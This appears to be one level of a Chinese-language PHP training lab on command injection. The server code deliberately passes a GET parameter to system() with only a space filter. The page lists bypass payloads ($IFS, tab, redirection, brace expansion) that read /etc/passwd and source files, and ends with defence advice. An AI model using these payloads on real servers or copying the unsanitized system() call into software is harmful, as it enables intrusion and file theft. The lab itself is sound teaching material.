<?php
/**
 * Level 4: 空格过滤绕过
 * 难度: ★★☆☆☆
 * 描述: 过滤了空格字符，需要使用替代方案
 * 目标: 使用$IFS、Tab等方式绕过空格过滤
 */

$message = '';
$output = '';
$blocked = false;

if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];

    // 检测空格
    if (strpos($cmd, ' ') !== false) {
        $blocked = true;
        $message = '<div class="error">❌ 检测到空格字符！</div>';
    }

    if (!$blocked) {
        ob_start();
        system($cmd . " 2>&1");
        $output = ob_get_clean();
        $message = '<div class="success">✅ 命令执行成功</div>';
    }
}
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>Level 4 - 空格过滤绕过</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Microsoft YaHei', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 30px;
        }
        .header h1 { font-size: 28px; margin-bottom: 5px; }
        .header .difficulty { opacity: 0.9; font-size: 14px; }
        .content { padding: 30px; }
        .info-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            margin-bottom: 20px;
            border-left: 4px solid #667eea;
        }
        .info-box h3 { color: #333; margin-bottom: 10px; }
        .info-box ul, .info-box ol { margin-left: 20px; line-height: 1.8; color: #666; }
        .form-box {
            background: #f8f9fa;
            padding: 30px;
            border-radius: 8px;
            margin-bottom: 20px;
        }
        input[type="text"] {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
            margin: 10px 0;
            font-family: 'Courier New', monospace;
        }
        input[type="submit"] {
            background: #667eea;
            color: white;
            padding: 12px 30px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
        }
        input[type="submit"]:hover { background: #5568d3; }
        .success {
            background: #d4edda;
            color: #155724;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #28a745;
        }
        .error {
            background: #f8d7da;
            color: #721c24;
            padding: 15px;
            border-radius: 5px;
            margin-bottom: 20px;
            border-left: 4px solid #dc3545;
        }
        .hint {
            background: #fff3cd;
            color: #856404;
            padding: 15px;
            border-radius: 5px;
            margin-top: 20px;
            border-left: 4px solid #ffc107;
        }
        .code-box {
            background: #2d2d2d;
            color: #f8f8f2;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            margin: 15px 0;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        .result-box {
            background: #2d2d2d;
            color: #00ff00;
            border: 1px solid #444;
            padding: 15px;
            border-radius: 5px;
            max-height: 400px;
            overflow: auto;
            font-family: 'Courier New', monospace;
            font-size: 14px;
        }
        .result-box pre {
            margin: 0;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        .back-link {
            display: inline-block;
            margin-top: 20px;
            color: #667eea;
            text-decoration: none;
        }
        table { width: 100%; border-collapse: collapse; margin: 10px 0; }
        table th, table td { padding: 10px; text-align: left; border: 1px solid #ddd; font-size: 13px; }
        table th { background: #f8f9fa; }
        code { background: #f4f4f4; padding: 2px 6px; border-radius: 3px; font-family: 'Courier New', monospace; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Level 4 - 空格过滤绕过</h1>
            <div class="difficulty">难度: ★★☆☆☆ | 技巧: $IFS、Tab、重定向</div>
        </div>

        <div class="content">
            <div class="info-box">
                <h3>📋 关卡说明</h3>
                <ul>
                    <li>服务器过滤了空格字符</li>
                    <li>许多命令需要空格分隔参数</li>
                    <li>例如: <code>cat /etc/passwd</code> 无法直接使用</li>
                    <li>需要找到空格的替代方案</li>
                </ul>
            </div>

            <div class="info-box">
                <h3>💡 空格绕过方法</h3>
                <table>
                    <tr>
                        <th style="width: 120px;">方法</th>
                        <th style="width: 200px;">示例</th>
                        <th>说明</th>
                    </tr>
                    <tr>
                        <td><code>$IFS</code></td>
                        <td><code>cat$IFS/etc/passwd</code></td>
                        <td>内部字段分隔符，默认包含空格</td>
                    </tr>
                    <tr>
                        <td><code>${IFS}</code></td>
                        <td><code>cat${IFS}/etc/passwd</code></td>
                        <td>花括号形式，更明确</td>
                    </tr>
                    <tr>
                        <td><code>$IFS$9</code></td>
                        <td><code>cat$IFS$9/etc/passwd</code></td>
                        <td>$9是空参数，组合使用</td>
                    </tr>
                    <tr>
                        <td><code>%09</code> (Tab)</td>
                        <td><code>cat%09/etc/passwd</code></td>
                        <td>制表符，URL编码后</td>
                    </tr>
                    <tr>
                        <td><code>&lt;</code> 重定向</td>
                        <td><code>cat</code><code>&lt;</code><code>/etc/passwd</code></td>
                        <td>使用重定向符代替空格</td>
                    </tr>
                    <tr>
                        <td>大括号扩展</td>
                        <td><code>{cat,/etc/passwd}</code></td>
                        <td>Bash的大括号扩展</td>
                    </tr>
                </table>
            </div>

            <div class="info-box">
                <h3>🎯 通关��标</h3>
                <ol>
                    <li>使用 $IFS 执行带参数的命令</li>
                    <li>尝试使用 Tab(%09) 绕过</li>
                    <li>成功读取 /etc/passwd 或其他文件</li>
                    <li>理解不同方法的优缺点</li>
                </ol>
            </div>

            <?php echo $message; ?>

            <div class="form-box">
                <h3>命令执行测试</h3>
                <p style="margin-bottom: 10px; color: #dc3545; font-weight: bold;">
                    ⚠️ 空格字符已被过滤！
                </p>
                <form method="GET">
                    <label>输入命令（不能包含空格）:</label>
                    <input type="text" name="cmd" placeholder="cat$IFS/etc/passwd" value="<?php echo isset($_GET['cmd']) ? htmlspecialchars($_GET['cmd']) : ''; ?>" />
                    <input type="submit" value="执行命令" />
                </form>
            </div>

            <?php if ($output !== ''): ?>
            <div class="result-box">
                <h3 style="color: #00ff00; margin-bottom: 10px;">执行结果:</h3>
                <pre><?php echo htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); ?></pre>
            </div>
            <?php endif; ?>

            <div class="hint">
                <strong>🔍 漏洞代码:</strong>
                <div class="code-box">$cmd = $_GET['cmd'];

// 检测空格
if (strpos($cmd, ' ') !== false) {
    die("检测到空格字符！");
}

system($cmd);  // ❌ 只过滤了空格，但有很多替代方案</div>

                <p><strong>攻击示例 - 使用 $IFS:</strong></p>
                <div class="code-box"># Linux
?cmd=cat$IFS/etc/passwd
?cmd=ls$IFS-la
?cmd=cat${IFS}/etc/passwd
?cmd=cat$IFS$9/etc/passwd

# Windows
?cmd=type$IFS C:\Windows\system.ini
?cmd=dir$IFS C:\</div>

                <p><strong>攻击示例 - 使用 Tab(%09):</strong></p>
                <div class="code-box"># 注意: 需要 URL 编码
?cmd=cat%09/etc/passwd
?cmd=ls%09-la
?cmd=type%09C:\Windows\system.ini</div>

                <p><strong>攻击示例 - 使用重定向:</strong></p>
                <div class="code-box"># 使用 < 符号
?cmd=cat</etc/passwd

# 注意: 不是所有命令都支持这种方式</div>

                <p><strong>攻击示例 - 使用大括号:</strong></p>
                <div class="code-box"># Bash 大括号扩展
?cmd={cat,/etc/passwd}
?cmd={ls,-la}</div>

                <p><strong>尝试执行:</strong></p>
                <ul>
                    <li><code>cat$IFS/etc/passwd</code> - 读取用户文件</li>
                    <li><code>ls$IFS-la</code> - 列出详细文件</li>
                    <li><code>cat%09/etc/hosts</code> - 使用Tab</li>
                    <li><code>cat${IFS}index.php</code> - 读取源码</li>
                    <li><code>whoami</code> - 不需要参数的命令</li>
                </ul>

                <p style="margin-top: 15px;"><strong>$IFS 详解:</strong></p>
                <ul>
                    <li>IFS = Internal Field Separator（内部字段分隔符）</li>
                    <li>默认值包含: 空格、Tab、换行</li>
                    <li>Shell 会将 $IFS 展开为这些分隔符之一</li>
                    <li>因此可以用来替代空格</li>
                </ul>

                <p style="margin-top: 15px;"><strong>防御建议:</strong></p>
                <ul>
                    <li>不要只过滤单个字符（如空格）</li>
                    <li>使用白名单验证整个命令</li>
                    <li>避免使用 system() 等函数</li>
                    <li>使用 escapeshellarg() 保护参数</li>
                </ul>
            </div>

            <a href="index.php" class="back-link">← 返回首页</a> |
            <a href="level3.php" class="back-link">← 上一关</a> |
            <a href="level5.php" class="back-link">下一关 →</a>
        </div>
    </div>
</body>
</html>
